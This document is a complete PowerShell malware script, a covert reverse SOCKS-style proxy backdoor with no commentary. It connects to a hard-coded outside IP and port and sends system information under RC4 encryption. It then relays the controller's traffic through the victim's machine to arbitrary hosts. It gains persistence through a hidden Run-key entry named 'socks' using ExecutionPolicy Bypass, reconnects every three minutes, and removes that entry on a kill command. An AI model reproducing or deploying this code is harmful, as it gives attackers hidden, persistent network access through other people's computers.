$domain = '91.92.136.20' # host
$dport = 4001  # port

$x = New-Object byte[] 50

For ($i=0; $i -ne 50; $i++) { $x[$i] =  $i }

Function crypt4($passw, [int]$length, $buff0, $start, $sz)
{

	$rc4 = New-Object byte[] 256
	
	[int]$param0 = 0
	
	[int]$param1 = 0
	
	[int]$param2 = 0
	
	[int]$param3 = 0
	
	[int]$param4 = 0
	
	[int]$param5 = 0
	
	[int]$param6 = 0
	
	[int]$param7 = 0
	
	[int]$param8 = 0
	
	[int]$t = 0
	
	[int]$gs = 0
	
	For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
	
	do
	{
		 if ($gs -eq 0)
		 {
			 $param2 = 0

			 $param3 = $length
		 }

		 if ($gs -ne 0)
		 {
			 $gs = 0

			 $param2++

			 if (--$param3 -eq 0)
			 {
				 continue
			 }
			 
		 }
		 
		 $param7 = $rc4[$param0]

		 $t = $passw[$param2] -as[int]

		 $param1 += $t

		 $param1 = $param1 -band 255

		 $param1 += $param7

		 $param1 = $param1 -band 255

		 $param6 = $rc4[$param1]
		 
		 $rc4[$param0] = $param6

		 $rc4[$param1] = $param7

		 $param0++

		 $param0 = $param0 -band 255

		 if ($param0 -ne 0)
		 {
			 $gs = 1
			 
			 continue
		 }

		 $param4 = $sz

		 $param1 = 0

		 $param0 = 0

		 $param2 = 0

		 $param3 = 0
		 
		 do
		 {
			 $param2++

			 $param2 = $param2 -band 255

			 $param7 = $rc4[$param2]
			 
			 $param1 += $param7

			 $param1 = $param1 -band 255

			 $param8 = $rc4[$param1]

			 $rc4[$param2] = $param8

			 $rc4[$param1] = $param7

			 $param8 += $param7
	
			 $param8 = $param8 -band 255

			 $param0 = $rc4[$param8]
			 
			 $param5 = $buff0[$start + $param3]

			 $param5 = $param5 -bxor $param0
			 
			 $buff0[$start + $param3] = $param5 -as [byte]

			 $param3++
			 
			 if (--$param4 -eq 0)
			 {
				 break
			 }
		 }
		 
		 while($true)
		 
		 break
	}
	
	while($true)
}

$newconnct={
	
	 Param
	 (
		 $sArray,
		 $param2,
		 $ip,
		 $newport,
		 $xor_,
		 $s,
		 $w,
		 $r
	 )
	 
	 Function crypt42($passw, [int]$length, $buff0, $start, $sz)
	 {

		 $rc4 = New-Object byte[] 256
	
		 [int]$param0 = 0
	
		 [int]$param1 = 0
	
		 [int]$param2 = 0
	
		 [int]$param3 = 0
	
		 [int]$param4 = 0
	
		 [int]$param5 = 0
	
		 [int]$param6 = 0
	
		 [int]$param7 = 0
	
		 [int]$param8 = 0
	
		 [int]$t = 0
	
		 [int]$gs = 0
	
		 For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
	
		 do
		 {
			 if ($gs -eq 0)
			 {
				 $param2 = 0

				 $param3 = $length
			 }

			 if ($gs -ne 0)
			 {
				 $gs = 0

				 $param2++

				 if (--$param3 -eq 0)
				 {
					 continue
				 }
			 
			 }
		 
			 $param7 = $rc4[$param0]

			 $t = $passw[$param2] -as[int]

			 $param1 += $t

			 $param1 = $param1 -band 255

			 $param1 += $param7

			 $param1 = $param1 -band 255

			 $param6 = $rc4[$param1]
		 
			 $rc4[$param0] = $param6

			 $rc4[$param1] = $param7

			 $param0++

			 $param0 = $param0 -band 255

			 if ($param0 -ne 0)
			 {
				 $gs = 1
			 
				 continue
			 }

			 $param4 = $sz

			 $param1 = 0

			 $param0 = 0

			 $param2 = 0

			 $param3 = 0
		 
			 do
			 {
				 $param2++

				 $param2 = $param2 -band 255

				 $param7 = $rc4[$param2]
			 
				 $param1 += $param7

				 $param1 = $param1 -band 255

				 $param8 = $rc4[$param1]

				 $rc4[$param2] = $param8

				 $rc4[$param1] = $param7

				 $param8 += $param7
	
				 $param8 = $param8 -band 255

				 $param0 = $rc4[$param8]
			 
				 $param5 = $buff0[$start + $param3]

				 $param5 = $param5 -bxor $param0
			 
				 $buff0[$start + $param3] = $param5 -as [byte]

				 $param3++
			 
				 if (--$param4 -eq 0)
				 {
					 break
				 }
			 }
		 
			 while($true)
		 
			 break
		 }
	
		 while($true)
	 }
	 
	 [int]$tr = 0
	 
	 $cs = $null
	 
	 $bf = New-Object byte[] 65536
	 
	 $buffer = New-Object byte[] 13
	 
	 For ($i=0; $i -ne 13; $i++) { $buffer[$i] = 0x00 }
	 
	 $buffer[0] = $param2 -as [byte]
	 
	 $buffer[1]  = 0x0A
	 $buffer[3]  = 0x05
	 $buffer[6]  = 0x01

	 try
	 {
		 $_t = 1

		 $sArray[$param2] = New-Object System.Net.Sockets.TcpClient( $ip, $newport)
		 
		 $cs = $sArray[$param2];
	 
		 $sArray[$param2].NoDelay = $true
	 
		 $sArray[$param2].ReceiveTimeout = $_t * 1000
	 
		 $s[$param2] = $sArray[$param2].GetStream()
	 
		 $r[$param2] = New-Object System.IO.BinaryReader($s[$param2])
	 
		 $w[$param2] = New-Object System.IO.BinaryWriter($s[$param2])
		 
		 crypt42 $xor_ 50 $buffer 0 3
		 crypt42 $xor_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
	 
	 catch
	 
	 {
		 #$sArray[$param2] = $null
		 
		 $buffer[4] = 0x01
		 
		 crypt42 $xor_ 50 $buffer 0 3
		 crypt42 $xor_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
		 
	 try
	 {
		 do
		 {
			 try
		 
			 {
				 $st = [int](Get-Date -uformat "%s")
				 
				 $rc = $r[$param2].Read($bf, 3, 65530)
				  
				 if ($rc -eq 0) { break }
				 
			  }
			  
			 catch
			 
			 {
				 $end = [int](Get-Date -uformat "%s")
				 
				 $Time = $end - $st
				 
				 if ($Time -ge $_t)
				 {
					 continue
				 }
				 
				 break
			 }
			 
			 $bf[0] = $param2 -as[byte]
			 
			 $rc0 = $rc -band 0x000000ff
			 $rc1 = [math]::Floor(($rc -band 0x0000ff00) * [math]::Pow(2,-8))
			 
			 $bf[1] = $rc0 -as[byte]
			 $bf[2] = $rc1 -as[byte]
			 
			 crypt42 $xor_ 50 $bf 0 3
			 crypt42 $xor_ 50 $bf 3 $rc
			 
			 $w[0].Write($bf, 0, $rc + 3)
			 $w[0].Flush()
		 }
		 
		 while($sArray[$param2] -ne $null)
		 
	 }
	 
	 catch
	 
	 {
		 $tr++
	 }
	 
	 #$sArray[$param2] = $null
	 
	 $buffer[0] = $param2 -as [byte]
	 $buffer[1] = 0x00
	 $buffer[2] = 0x00
	 
	 crypt42 $xor_ 50 $buffer 0 3
	 
	 $w[0].Write($buffer, 0, 3)
	 $w[0].Flush()
	 
	 if ($cs -ne $null) { $cs.Close() }
	 
}

Function backnct([string]$domain, [int]$dport)
{
	 $buffer = New-Object byte[] 3
	 
	 $sArray = @(0) * 200
	 
	 For ($i=0; $i -ne 200; $i++) { $sArray[$i] = $null }
	 
	 $s = @(0) * 200
	 
	 $w = @(0) * 200
	 
	 $r = @(0) * 200
	 
	 $_t = 120
	 
	 [int]$tr = 0
	 
	 [int]$newport = 0
	 
	 [string]$ip
	 
	 [int]$param1 = 0
	 
	 [int]$param2 = 0
	 
	 [int]$param0 = 0
	 
	 [int]$param9 = 0
	 
	 [int]$param12 = 0
	 
	 [int]$rc = 0
	 
	 [int]$param10 = 0
	 
	 [int]$param11 = 0
	 
	 [int]$rm = 0
	 
	 [int]$rm4 = 0
	 
	 $j = New-Object object[] 200
	 
	 $bf7 = New-Object byte[] 20
	 
	 $bf0 = New-Object byte[] 65536

	 $bf1 = New-Object byte[] 65536

	 $rb = New-Object byte[] 65536
	 
	 try
	 
	 {
		 $pool = [RunspaceFactory]::CreateRunspacePool(1, 200)
		 $pool.Open()
		 
		 $sArray[0] = New-Object System.Net.Sockets.TcpClient( $domain, $dport)
	 
		 $sArray[0].NoDelay = $true
	 
		 $sArray[0].ReceiveTimeout = $_t * 1000
	 
		 $s[0] = $sArray[0].GetStream()
	 
		 $r[0] = New-Object System.IO.BinaryReader($s[0])
	 
		 $w[0] = New-Object System.IO.BinaryWriter($s[0])
		 
		 For ($i=0; $i -ne 50; $i++) { $bf0[$i] = $x[$i] }
		 
		 For ($i=50; $i -ne 100; $i++) { $bf0[$i] = 0 }
	 
		 $i64 = 0
	 
		 if ([IntPtr]::Size -eq 8) {$i64 = 1}
		 
		 $bf0[53] = $i64 -as[byte]
	 
		 $os = [system.environment]::osversion.version.build
	 
		 $o0 = $os -band 0x000000ff
		 $o1 = [math]::Floor(($os -band 0x0000ff00) * [math]::Pow(2,-8))
		 
		 $bf0[50] = $o0 -as[byte]
		 $bf0[51] = $o1 -as[byte]
	 
		 $bf0[54] = 0x50 -as[byte]
		 $bf0[55] = 0x53 -as[byte]
		 
		 crypt4 $x 50 $bf0 50 50
		 
		 $w[0].Write($bf0, 0, 100)
		 $w[0].Flush()
		 
		 [int]$receive7 = 0
		 
	 	 while($true)
	 	 {
			 $st = [int](Get-Date -uformat "%s")
			 
			 try
		 
		 	 {
			 	 if ($param10 -eq 0 -and $rm4 -ne 4)
	 	 	 	 {
				 	 $rc = $r[0].Read($bf1, 0, 65536)
					 
					 if ($rc -eq 0)
					 {
						 break
					 }
					 
					 $receive7 = 0
			 	 }
		 	 }
	 
		 	 catch
	 
		 	 {
			 	 $end = [int](Get-Date -uformat "%s")
				 
				 $Time = $end - $st
				 
			 	 if ($Time -ge $_t)
			 	 {
				 	 if ($rm -ne 0 -or $rm4 -ne 0) { break }
					 
					 $receive7++
					 
					 if ($receive7 -eq 7) { break }
					 
					 if ($receive7 -eq 5)
					 {
						 $bf7[0] = 0x00 -as[byte]
						 $bf7[1] = 0x00 -as[byte]
						 $bf7[2] = 0x00 -as[byte]
					 
						 crypt4 $x 50 $bf7 0 3
					 
						 $w[0].Write($bf7, 0, 3)
						 $w[0].Flush()
					 }
					 
				 	 continue
			 	 }
				 
			 	 break
		 	 }
			 
		 	 if ($rm -ne 0 -or $rm4 -eq 4)
	 	 	 {
			 	 if ($bf0[2 + 0] -eq 0x00 -as[byte] -and $bf0[2 + 1] -eq 0x00 -as[byte])
			 	 {
	 	 		 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFE -as[byte])
	 	 		 	 {
	 	 			 	 $param12 = 1
						 
	 	 			 	 break
	 	 		 	 }
					 
					 if ($bf0[0 + 0] -eq 0x00 -as[byte] -and $bf0[0 + 1] -eq 0x00 -as[byte])
					 
					 {
						 
						 $bf0[0 + 0] = 0x00 -as[byte]
						 
					 }
					 
					 else
					 
					 {
						 
						 $param0 = $bf0[1]

						 if ($sArray[$param0] -ne $null) { $sArray[$param0] = $null }
						 
					 }
					 
	 	 	 	 }
			 
	 	 	 	 else
			 
	 	 	 	 {
	 	 		 	 if ($param10 -eq 0)
	 	 		 	 {
					 	 if ($rc -eq 0)
					 	 {
						 
						 	 try
						 
						 	 {
							 
							 	 $rc = $r[0].Read($bf1, 0, 65536)
								 
								 if ($rc -eq 0)
								 {
									 break
								 }
							 
						 	 }
						 
						 	 catch
						 
						 	 {
								 break
							 
						 	 }
						 
					 	 }

					 	 if ($rc -lt 0 -or $rc -eq 0)
						 {
							 break
						 }

					 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }

	 	 			 	 $param10 = $rc
					 
	 	 			 	 $param11 = 0
					 
					 	 $rc = 0
	 	 		 	 }
				 
	 	 		 	 $param9 = $rm
				 
				 	 $param0 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

	 	 		 	 $param0 -= $param9
				 
	 	 		 	 if ($param10 -le $param0) { $param0 = $param10 }
				 
				 	 For ($i=0; $i -ne $param0; $i++) { $bf0[$i + $param9 + 4] = $rb[$i + $param11] }
				 
	 	 		 	 $param11 += $param0
				 
	 	 		 	 $param10 -= $param0
				 
	 	 		 	 $rm += $param0
					 
				 	 if ((256 * $bf0[2 + 1] + $bf0[2 + 0]) -eq $rm)
	 	 		 	 {
						 $param1 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

						 crypt4 $x 50 $bf0 4 $param1
					 
	 	 			 	 $param2 = $bf0[1]
					 
	 	 			 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFF -as[byte])
	 	 			 	 {
	 	 				 	 $tr++
					 	 }
					 
	 	 			 	 elseif ($bf0[0] -eq 0x00 -as[byte])
					 
	 	 			 	 {
						 	 if ($bf0[4 + 3] -eq 0x03 -as[byte])
						 	 {
							 	 $newport = 256 * $bf0[4 + 5 + $bf0[4 + 4] + 0] + $bf0[4 + 5 + $bf0[4 + 4] + 1]
								 
							 	 $fB = New-Object byte[] $bf0[4 + 4]
								 
							 	 For ($i=0; $i -ne $bf0[4 + 4] -as[int]; $i++) { $fB[$i] = $bf0[$i + 4 + 5] }
								 
							 	 [string]$ip = [System.Text.Encoding]::ASCII.GetString($fB)
						 	 }

						 	 elseif ($bf0[4 + 3] -eq 0x01 -as[byte])

						 	 {
							 	 [int]$a = $bf0[4 + 4 + 0] -as[int]
							 	 [int]$b = $bf0[4 + 4 + 1] -as[int]
							 	 [int]$c = $bf0[4 + 4 + 2] -as[int]
							 	 [int]$ip = $bf0[4 + 4 + 3] -as[int]

							 	 [string]$ip = "{0}.{1}.{2}.{3}" -f $a, $b, $c, $ip

							 	 $newport = 256 * $bf0[4 + 8 + 0] + $bf0[4 + 8 + 1]
						 	 }

						 	 else

                         	 {
							 	 [string]$ip = "hoonigan"

							 	 $newport = 0

						 	 }

							 $rp = [PowerShell]::Create()
							 $rp.RunspacePool = $pool

							 [void]$rp.AddScript($newconnct)
		
							 [void]$rp.AddParameter("sArray", $sArray)
							 [void]$rp.AddParameter("param2", $param2)
							 [void]$rp.AddParameter("ip", $ip)
							 [void]$rp.AddParameter("newport", $newport)
							 [void]$rp.AddParameter("xor_", $x)
							 [void]$rp.AddParameter("s", $s)
							 [void]$rp.AddParameter("w", $w)
							 [void]$rp.AddParameter("r", $r)
							 
							 $j[$i] = [PSCustomObject]@{
								 PowerShell = $rp
								 AsyncResult = $rp.BeginInvoke()
							 }
							 
						 }
					 
	 	 			 	 else
					 
	 	 			 	 {
						 	 try
						 
						 	 {
						 
							 	 $w[$param2].Write($bf0, 4, $param1)
							 	 $w[$param2].Flush()
							 
						 	 }
						 
						 	 catch
						 
						 	 {
							 
							 	 $tr++
							 
						 	 }
	 	 			 	 }
					 
	 	 			 	 $rm = 0
	 	 		 	 }
	 	 	 	 }
	 	 			 
	 	 	 	 $rm4 = 0

	 	 	 }
	 	 		 
	 	 	 else 
	 	 		
	 	 	 {
	 	 	 	 if ($param10 -eq 0)
	 	 	 	 {
				 	 if ($rc -eq 0)
				 	 {
					 
					 	 try
					 
					 	 {
						 
						 	 $rc = $r[0].Read($bf1, 0, 65536)
							 
							 if ($rc -eq 0)
							 {
								 break
							 }
							 
					 	 }
					 
					 	 catch
					 
					 	 {
						 	 break
						
					 	 }
					
				 	 }
					 

				 	 if ($rc -lt 0 -or $rc -eq 0)
					 {
						 break
					 }
					 
				 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }
				 
				 	 $param10 = $rc
				 
				 	 $param11 = 0
				 
				 	 $rc = 0
	 	 	 	 }
			 
	 	 	 	 $param0 = $rm4
			 
	 	 	 	 $param9 = 4
			 
	 	 	 	 $param9 -= $rm4
			 
	 	 	 	 if ($param10 -lt $param9) { $param9 = $param10 }
			 
			 	 For ($i=0; $i -ne $param9; $i++) { $bf0[$i + $param0] = $rb[$i + $param11] }
			 
	 	 	 	 $param11 += $param9
			 
	 	 	 	 $param10 -= $param9
			 
	 	 	 	 $rm4 += $param9
			 
	 	 	 	 if ($rm4 -eq 4) { crypt4 $x 50 $bf0 0 4 }
	 	 	 }
	 	 }
	 
	 	 if ($param12 -eq 1)
	 	 {
		 	 Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks"

		 	 [Environment]::Exit(0)
		 }
		 
		 throw "close"
	 
	 }
	 
	 catch
	 {
		 $message = $_
		 Write-Warning "Something happened! $message"
		 
		 $pool.Dispose()
		 
		 if ($sArray[0] -ne $null) { $sArray[0].Close() }
	 }
}

try
{
	 Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks" -Value "Powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""

}

catch { }

while($true)
{
	 backnct $domain $dport
	 
	 Start-Sleep -s 180
}